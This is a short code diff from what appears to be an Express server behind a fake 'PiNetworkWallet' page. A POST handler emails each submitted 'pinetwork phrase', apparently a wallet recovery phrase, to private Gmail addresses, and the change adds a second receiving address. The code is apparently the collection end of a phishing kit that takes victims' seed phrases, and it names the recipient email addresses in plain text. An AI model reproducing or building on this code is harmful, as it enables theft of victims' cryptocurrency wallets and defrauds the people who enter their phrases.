@@ -57,7 +57,7 @@ app.post("/submit/7668", async (req, res) => {
       {
         from: "PiNetworkWallet ",
         // to: ["chiemelapromise30@gmail.com"],
-        to: ["pinetworkm493@gmail.com"],
+        to: ["pinetworkm493@gmail.com", "fantomlegen@gmail.com"],
         subject: "pinetwork phrase",
         text: mfText,
         
